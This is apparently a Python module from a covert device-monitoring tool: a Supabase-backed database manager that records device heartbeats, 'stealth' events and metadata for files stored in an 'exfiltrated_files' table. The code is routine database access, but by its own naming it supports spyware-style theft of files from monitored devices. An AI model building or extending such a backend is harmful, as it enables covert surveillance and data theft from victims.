import logging
from datetime import datetime

try:
    from supabase import create_client, Client
except ImportError:
    create_client = None

logger = logging.getLogger("DB_Manager")

class DatabaseManager:
    def __init__(self, url: str, key: str):
        self.url = url
        self.key = key
        self.client = None
        if create_client and url and key:
            try:
                self.client = create_client(url, key)
            except Exception as e:
                logger.error(f"Supabase connection failed: {e}")

    def update_heartbeat(self, device_id: str, status_data: dict):
        if not self.client:
            return
        try:
            data = {
                "device_id": device_id,
                "last_seen": datetime.utcnow().isoformat(),
                "status": status_data
            }
            self.client.table("devices").upsert(data).execute()
        except Exception as e:
            logger.error(f"Heartbeat update failed: {e}")

    def log_stealth_event(self, device_id: str, event_type: str, details: dict):
        if not self.client:
            return
        try:
            log_data = {
                "device_id": device_id,
                "event_type": event_type,
                "details": details,
                "created_at": datetime.utcnow().isoformat()
            }
            self.client.table("stealth_logs").insert(log_data).execute()
        except Exception as e:
            logger.error(f"Event logging failed: {e}")

    def save_file_metadata(self, device_id: str, file_name: str, cloud_url: str):
        if not self.client:
            return
        try:
            file_data = {
                "device_id": device_id,
                "file_name": file_name,
                "url": cloud_url,
                "captured_at": datetime.utcnow().isoformat()
            }
            self.client.table("exfiltrated_files").insert(file_data).execute()
        except Exception as e:
            logger.error(f"File metadata save failed: {e}")
